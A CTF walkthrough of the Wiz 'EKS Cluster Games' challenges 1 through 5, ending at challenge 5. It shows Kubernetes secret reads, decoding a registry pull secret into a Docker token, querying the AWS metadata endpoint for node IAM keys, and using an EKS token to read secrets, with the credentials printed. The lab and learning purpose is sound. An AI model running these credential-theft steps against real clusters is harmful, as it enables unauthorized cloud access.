---
description: https://eksclustergames.com/
cover: ../../.gitbook/assets/EKS Cluster.png
coverY: 0
---

# EKS Cluster Games

## Challenge 1 - Secret Seeker

> Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?

{% code title="Permissions" %}
```json
{
    "secrets": [
        "get",
        "list"
    ]
}
```
{% endcode %}

```bash
> kubectl get secrets
NAME         TYPE     DATA   AGE
log-rotate   Opaque   1      527d

> kubectl get secret log-rotate -o yaml
apiVersion: v1
data:
  flag: d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==
kind: Secret

> echo d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ== | base64 --decode
wiz_eks_challenge{omg_over_privileged_secret_access}
```

## Challenge 2 - Registry Hunt

> A thing we learned during our research: always check the container registries.
>
> For your convenience, the [crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md) utility is already pre-installed on the machine.

{% code title="Permissions" %}
```json
{
    "secrets": [
        "get"
    ],
    "pods": [
        "list",
        "get"
    ]
}
```
{% endcode %}

<pre class="language-bash"><code class="lang-bash"><strong>> kubectl get pods
</strong>NAME                    READY   STATUS    RESTARTS       AGE
database-pod-2c9b3a4e   1/1     Running   14 (20d ago)   527d

> kubectl describe pods database-pod-2c9b3a4e
Name:         database-pod-2c9b3a4e
Namespace:    challenge2
Priority:     0
Node:         ip-192-168-21-50.us-west-1.compute.internal/192.168.21.50
Start Time:   Wed, 01 Nov 2023 13:32:05 +0000
Labels:       &#x3C;none>
Annotations:  kubernetes.io/psp: eks.privileged
              pulumi.com/autonamed: true
Status:       Running
IP:           192.168.12.173
IPs:
  IP:  192.168.12.173
Containers:
  my-container:
    Container ID:   containerd://4cd1857655feeac1bece44b800e910ee3e4e1968c2ceaa173d4d904b12c3b6e5
    Image:          eksclustergames/base_ext_image
    Image ID:       docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623
    Port:           &#x3C;none>
    Host Port:      &#x3C;none>
    State:          Running
      Started:      Sun, 23 Mar 2025 06:44:23 +0000
    Last State:     Terminated
      Reason:       Completed
      Exit Code:    0
      Started:      Sat, 15 Feb 2025 00:22:05 +0000
      Finished:     Sun, 23 Mar 2025 06:44:22 +0000
    Ready:          True
    Restart Count:  14
    Environment:    &#x3C;none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-cq4m2 (ro)
Conditions:
  Type              Status
  Initialized       True 
  Ready             True 
  ContainersReady   True 
  PodScheduled      True 
Volumes:
  kube-api-access-cq4m2:
    Type:                    Projected (a volume that contains injected data from multiple sources)
    TokenExpirationSeconds:  3607
    ConfigMapName:           kube-root-ca.crt
    ConfigMapOptional:       &#x3C;nil>
    DownwardAPI:             true
QoS Class:                   BestEffort
Node-Selectors:              &#x3C;none>
Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:                      &#x3C;none>
</code></pre>

We can see the image registry from the output&#x20;

```
Image:          eksclustergames/base_ext_image
Image ID:       docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623
```

Crane is already installed in shell we can try to pull the image but we are missing an argument most probably because we are not authorised.&#x20;

```
> crane pull eksclustergames/base_ext_image
Error: requires at least 2 arg(s), only received 1
```

```bash
 > kubectl get secrets registry-pull-secrets-780bab1d -o yaml
 apiVersion: v1
data:
  .dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19
kind: Secret

> echo eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19 | base64 -d
{"auths": {"index.docker.io/v1/": {"auth": "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw=="}}}

> echo ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw== | base64 -d
eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
```

With this cred let's try to login with crane.

```bash
> crane auth login -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo index.docker.io
2025/04/12 11:19:14 logged in via /home/user/.docker/config.json

> crane ls eksclustergames/base_ext_image
latest

> crane config eksclustergames/base_ext_image | jq
{
  "architecture": "amd64",
  "config": {
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": [
      "/bin/sleep",
      "3133337"
    ],
    "ArgsEscaped": true,
    "OnBuild": null
  },
  "created": "2023-11-01T13:32:18.920734382Z",
  "history": [
    {
      "created": "2023-07-18T23:19:33.538571854Z",
      "created_by": "/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "
    },
    {
      "created": "2023-07-18T23:19:33.655005962Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"sh\"]",
      "empty_layer": true
    },
    {
      "created": "2023-11-01T13:32:18.920734382Z",
      "created_by": "RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}' > /flag.txt # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2023-11-01T13:32:18.920734382Z",
      "created_by": "CMD [\"/bin/sleep\" \"3133337\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f",
      "sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432"
    ]
  }
}
```

> **Success!**
>
> Based on real events
>
> We successfully used this technique in both of our engagements with [Alibaba Cloud](https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r) and [IBM Cloud](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql) to obtain internal container images and to prove unauthorized access to cross-tenant data.

## Challenge 3 - Image Inquisition

> A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.
>
> Remember: You are running inside a compromised EKS pod.
>
> For your convenience, the [crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md) utility is already pre-installed on the machine.

{% code title="Permissions" %}
```json
{
    "pods": [
        "list",
        "get"
    ]
}
```
{% endcode %}

Lets list out  the pods first and check for more information

<pre class="language-bash"><code class="lang-bash"><strong>> kubectl get pods
</strong>NAME                      READY   STATUS    RESTARTS       AGE
accounting-pod-876647f8   1/1     Running   14 (20d ago)   527d

> kubectl get pod accounting-pod-876647f8 -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubernetes.io/psp: eks.privileged
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:32:10Z"
  name: accounting-pod-876647f8
  namespace: challenge3
  resourceVersion: "213766719"
  uid: dd2256ae-26ca-4b94-a4bf-4ac1768a54e2
spec:
  containers:
  - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
    imagePullPolicy: IfNotPresent
    name: accounting-container
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-mmvjj
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: ip-192-168-21-50.us-west-1.compute.internal
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: kube-api-access-mmvjj
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:10Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2025-03-23T06:44:19Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2025-03-23T06:44:19Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:10Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://36f702b04bf1eb580e43a32d8726cf94d5b4c2fe0c955f95ae00ad708eaccd70
    image: sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3
    imageID: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
    lastState:
      terminated:
        containerID: containerd://2c3db96340ae95782e33558fda6926e387e2e9338513512783ee6ac0a5527b08
        exitCode: 0
        finishedAt: "2025-03-23T06:44:17Z"
        reason: Completed
        startedAt: "2025-02-15T00:22:00Z"
    name: accounting-container
    ready: true
    restartCount: 14
    started: true
    state:
      running:
        startedAt: "2025-03-23T06:44:18Z"
  hostIP: 192.168.21.50
  phase: Running
  podIP: 192.168.5.251
  podIPs:
  - ip: 192.168.5.251
  qosClass: BestEffort
  startTime: "2023-11-01T13:32:10Z"
</code></pre>

We can see the image container hosted on AWS ECR. Let’s pull the image using crane.

```bash
> crane pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
Error: requires at least 2 arg(s), only received 1
```

We start by looking for credentials that can help us connect to the ECR repository. When working in a cloud environment, one way to check for interesting data is to look over the Amazon Metadata Service.

Looking at [hacktricks](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#aws) and find meta endpoints which are accessible at [http://169.254.169.254](http://169.254.169.254)

```bash
 > curl 169.254.169.254/latest/meta-data/iam/security-credentials/
 eks-challenge-cluster-nodegroup-NodeInstanceRole
 
 > curl 169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
{"AccessKeyId":"ASIA2AVYNEVMXHT245IC","Expiration":"2025-04-12 13:03:08+00:00","SecretAccessKey":"3OrPWbAF83GfThGuwoS3gcWeEK+bQLNnB87qAbCu","SessionToken":"FwoGZXIvYXdzEG0aDDiLxRXOplOlW1qqUyK3ARB2L1NwOohGfQejd3c1vOy5nbE4k/eXag910gp6KMrSMyYIYor8/1glZXhSVOcO/a4aAYjidmWePsTjKlc5zeqxfS0lbPjt4t6u8NXlzp1amNhhzrIJYo/dqvFR6ozxHfJdukmitdrjhHTn9pIpLsZ5Q5CCswNHwnaDEEXVvDnoQ/raPERKn5ZAl5/swesw6w9LNpLcRMmZMK34EqCWe03dbIdHlsDOAqVp6vQmGIL90HhhYdQUxij8rOm/BjIt3SVKZxcB7jUSbdQyatrQts808SWJbaz7bcZa9Qr6S6ZtnpNupVDnXxITapXk"}
```

We can load these manually onto environment variables and proceed from there

<pre class="language-bash"><code class="lang-bash"><strong>> export AWS_ACCESS_KEY_ID=ASIA2AVYNEVMZCX7QJ5J
</strong>> export AWS_SECRET_ACCESS_KEY=d1s97aN9Iu8ZXbTP4WRQTSY13cFnAs2X11H8aYW3
> export AWS_SESSION_TOKEN=FwoGZXIvYXdzEG4aDI95WEb51i7QPk+42iK3ASag3lEego4p8be67AodZHcR8w77fMnFgHwbkcudiA+MoRUIEkPMhcqm1IS0U0Gt1nk/gWp44kKc7cqxyGkaIYenrQF2XW+IAK6qHnrk2wRiBKJmmZGhANlRspWkTMgCFv2Mvjuiul7Gq2ebg/Fq5Jyojrkc94bDS9G6as44ptksTWJnNCGC+vCwzyRABM7PCi9RrXY3JKjru88TJk4HBg55LOkfKvHU8tA+zVDU9bfFJukoolgp3SiAu+m/BjIt/Dw/bNshrrjZnlwuZn6Obmhpm+gPt49XYU9Uocv5B5Ym0VYHWPBYm/mk82VO
> aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
</code></pre>

With these credentials we can get authenticated and pull data from ECR.

```bash
> export PASSWORD=$(aws ecr get-login-password --region us-west-1)

> crane auth login -u AWS -p PASSWORD 688655246681.dkr.ecr.us-west-1.amazonaws.com
2025/04/12 12:09:43 logged in via /home/user/.docker/config.json

> crane config "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01" | jq 
{
  "architecture": "amd64",
  "config": {
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": [
      "/bin/sleep",
      "3133337"
    ],
    "ArgsEscaped": true,
    "OnBuild": null
  },
  "created": "2023-11-01T13:32:07.782534085Z",
  "history": [
    {
      "created": "2023-07-18T23:19:33.538571854Z",
      "created_by": "/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "
    },
    {
      "created": "2023-07-18T23:19:33.655005962Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"sh\"]",
      "empty_layer": true
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "CMD [\"/bin/sleep\" \"3133337\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f",
      "sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"
    ]
  }
}
```

> In this challenge, you retrieved credentials from the Instance Metadata Service (IMDS). Moving forward, these credentials will be readily available in the pod for your ease of use.

## Challenge 4 - Pod Break

> You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?
>
> Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions

We have absolutely no access to even check the lost of available pods

```bash
> kubectl get pods
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:challenge4:service-account-challenge4" cannot list resource "pods" in API group "" in the namespace "challenge4"

>  aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

from the response we can see that the cluster name is `eks-challenge-cluster`&#x20;

We do not have permission to describe or list the cluster but are able to get a token.

```bash
> aws eks describe-cluster --name eks-challenge-cluster
An error occurred (AccessDeniedException) when calling the DescribeCluster operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:DescribeCluster on resource: arn:aws:eks:us-west-1:688655246681:cluster/eks-challenge-cluster

> aws  eks get-token --cluster-name eks-challenge-cluster --region us-west-1
{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.k8s.io/v1beta1",
    "spec": {},
    "status": {
        "expirationTimestamp": "2025-04-12T13:00:24Z",
        "token": "k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk00S0RJUTRPUCUyRjIwMjUwNDEyJTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTA0MTJUMTI0NjI0WiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFRzRhREJ6T2JuYXYwTDl4bjNVZ3pTSzNBU1FJOWxkNlZYYm1hViUyRjk3c0tXTFdZNWI3TWlsQXJBNk1qdmM2ajhtdEpXTWpHMmdYd24lMkZab2EwOFVyTnQ0UnhadlB0UkU3M25TNSUyRkNQOGpMVWNENEdXdG9DczZ5ekVJQjllZDJybWpSZXRBMWx6eWNYaDlUTlNOZyUyRjFETWx1ZFFObkZFMyUyRjREdWEzVXI0eDdpOUt2TU9NdWFhTlJ5aFBNNEhOTTZUWGtRdnFzRVRDdXFxWk5WMmlwRmlRWm03eWdXQkxqZHd3TVVoOGJuMmxnMmxpZ1VBSTNWeDRzUVFyJTJGJTJGTkNnQUI4SWE1TVBOVzBycm53U2pydmVtJTJGQmpJdG56d1pDY3BtT3V6N2VtcnhsVnI3YkhSUzlwM1NXZmFuQiUyRk9tZE5YVXU5MlE0RE5RRyUyQnRhTDIyTlQ3V1YmWC1BbXotU2lnbmF0dXJlPWM4Mzc0MzY2MjdiN2Q5YjA2MWQ5MmU2MzQ0MDQyYWViNWY2MzE2ZTljNmY0NDY3YjEwZmY5MTFmN2I4N2JlZDI"
    }
}

> kubectl auth can-i --list --token=k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk00S0RJUTRPUCUyRjIwMjUwNDEyJTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTA0MTJUMTI0NjI0WiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFRzRhREJ6T2JuYXYwTDl4bjNVZ3pTSzNBU1FJOWxkNlZYYm1hViUyRjk3c0tXTFdZNWI3TWlsQXJBNk1qdmM2ajhtdEpXTWpHMmdYd24lMkZab2EwOFVyTnQ0UnhadlB0UkU3M25TNSUyRkNQOGpMVWNENEdXdG9DczZ5ekVJQjllZDJybWpSZXRBMWx6eWNYaDlUTlNOZyUyRjFETWx1ZFFObkZFMyUyRjREdWEzVXI0eDdpOUt2TU9NdWFhTlJ5aFBNNEhOTTZUWGtRdnFzRVRDdXFxWk5WMmlwRmlRWm03eWdXQkxqZHd3TVVoOGJuMmxnMmxpZ1VBSTNWeDRzUVFyJTJGJTJGTkNnQUI4SWE1TVBOVzBycm53U2pydmVtJTJGQmpJdG56d1pDY3BtT3V6N2VtcnhsVnI3YkhSUzlwM1NXZmFuQiUyRk9tZE5YVXU5MlE0RE5RRyUyQnRhTDIyTlQ3V1YmWC1BbXotU2lnbmF0dXJlPWM4Mzc0MzY2MjdiN2Q5YjA2MWQ5MmU2MzQ0MDQyYWViNWY2MzE2ZTljNmY0NDY3YjEwZmY5MTFmN2I4N2JlZDI
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
                                                [/api/*]            []                 [get]
                                                [/api]              []                 [get]
                                                [/apis/*]           []                 [get]
                                                [/apis]             []                 [get]
                                                [/healthz]          []                 [get]
                                                [/healthz]          []                 [get]
                                                [/livez]            []                 [get]
                                                [/livez]            []                 [get]
                                                [/openapi/*]        []                 [get]
                                                [/openapi]          []                 [get]
                                                [/readyz]           []                 [get]
                                                [/readyz]           []                 [get]
                                                [/version/]         []                 [get]
                                                [/version/]         []                 [get]
                                                [/version]          []                 [get]
                                                [/version]          []                 [get]
podsecuritypolicies.policy                      []                  [eks.privileged]   [use]

> kubectl get secrets -o yaml --token=k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk00S0RJUTRPUCUyRjIwMjUwNDEyJTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTA0MTJUMTI0NjI0WiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFRzRhREJ6T2JuYXYwTDl4bjNVZ3pTSzNBU1FJOWxkNlZYYm1hViUyRjk3c0tXTFdZNWI3TWlsQXJBNk1qdmM2ajhtdEpXTWpHMmdYd24lMkZab2EwOFVyTnQ0UnhadlB0UkU3M25TNSUyRkNQOGpMVWNENEdXdG9DczZ5ekVJQjllZDJybWpSZXRBMWx6eWNYaDlUTlNOZyUyRjFETWx1ZFFObkZFMyUyRjREdWEzVXI0eDdpOUt2TU9NdWFhTlJ5aFBNNEhOTTZUWGtRdnFzRVRDdXFxWk5WMmlwRmlRWm03eWdXQkxqZHd3TVVoOGJuMmxnMmxpZ1VBSTNWeDRzUVFyJTJGJTJGTkNnQUI4SWE1TVBOVzBycm53U2pydmVtJTJGQmpJdG56d1pDY3BtT3V6N2VtcnhsVnI3YkhSUzlwM1NXZmFuQiUyRk9tZE5YVXU5MlE0RE5RRyUyQnRhTDIyTlQ3V1YmWC1BbXotU2lnbmF0dXJlPWM4Mzc0MzY2MjdiN2Q5YjA2MWQ5MmU2MzQ0MDQyYWViNWY2MzE2ZTljNmY0NDY3YjEwZmY5MTFmN2I4N2JlZDI
apiVersion: v1
items:
- apiVersion: v1
  data:
    flag: d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=
  kind: Secret
  metadata:
    creationTimestamp: "2023-11-01T12:27:57Z"
    name: node-flag
    namespace: challenge4
    resourceVersion: "883574"
    uid: 26461a29-ec72-40e1-adc7-99128ce664f7
  type: Opaque
kind: List
metadata:
  resourceVersion: ""
  
 > echo d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30= | base64 -d
 wiz_eks_challenge{only_a_real_pro_can_navigate_IMDS_to_EKS_congrats}
```

> In this task, you've acquired the Node's service account credentials. For future reference, these credentials will be conveniently accessible in the pod for you.
>
> Fun fact: The misconfiguration highlighted in this challenge is a common occurrence, and the same technique can be applied to any EKS cluster that doesn't enforce IMDSv2 hop limit.

## Challenge 5 - Container Secrets Infrastructure

{% tabs %}
{% tab title="IAM Policy" %}
```json
{
    "Policy": {
        "Statement": [
            {
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2",
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"
                ]
            }
        ],
        "Version": "2012-10-17"
    }
}
```
{% endtab %}

{% tab title="Trust Policy" %}
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com"
                }
            }
        }
    ]
}
```
{% endtab %}

{% tab title="Permissions" %}
```json
{
    "secrets": [
        "get",
        "list"
    ],
    "serviceaccounts": [
        "get",
        "list"
    ],
    "pods": [
        "get",
        "list"
    ],
    "serviceaccounts/token": [
        "create"
    ]
}
```
{% endtab %}
{% endtabs %}

```bash
> kubectl auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
                                                [/api/*]            []                 [get]
                                                [/api]              []                 [get]
                                                [/apis/*]           []                 [get]
                                                [/apis]             []                 [get]
                                                [/healthz]          []                 [get]
                                                [/healthz]          []                 [get]
                                                [/livez]            []                 [get]
                                                [/livez]            []                 [get]
                                                [/openapi/*]        []                 [get]
                                                [/openapi]          []                 [get]
                                                [/readyz]           []                 [get]
                                                [/readyz]           []                 [get]
                                                [/version/]         []                 [get]
                                                [/version/]         []                 [get]
                                                [/version]          []                 [get]
                                                [/version]          []                 [get]
podsecuritypolicies.policy                      []                  [eks.privileged]   [use]

> kubectl get serviceaccounts
NAME          SECRETS   AGE
debug-sa      0         528d
default       0         528d
s3access-sa   0         528d

> kubectl get serviceaccounts -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: ServiceAccount
  metadata:
    annotations:
      description: This is a dummy service account with empty policy attached
      eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e
    creationTimestamp: "2023-10-31T20:07:37Z"
    name: debug-sa
    namespace: challenge5
    resourceVersion: "671929"
    uid: 6cb6024a-c4da-47a9-9050-59c8c7079904
- apiVersion: v1
  kind: ServiceAccount
  metadata:
    creationTimestamp: "2023-10-31T20:07:11Z"
    name: default
    namespace: challenge5
    resourceVersion: "671804"
    uid: 77bd3db6-3642-40d5-b8c1-14fa1b0cba8c
- apiVersion: v1
  kind: ServiceAccount
  metadata:
    annotations:
      eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeEksS3Role
    creationTimestamp: "2023-10-31T20:07:34Z"
    name: s3access-sa
    namespace: challenge5
    resourceVersion: "671916"
    uid: 86e44c49-b05a-4ebe-800b-45183a6ebbda
kind: List
metadata:
  resourceVersion: ""
```

IAM role atached to "debug-sa" is `challengeTestRole-fc9d18e`and "s2access-sa" is `challengeEksS3Role`&#x20;

Lets create a token for debug-sa

```bash
> kubectl create token debug-sa
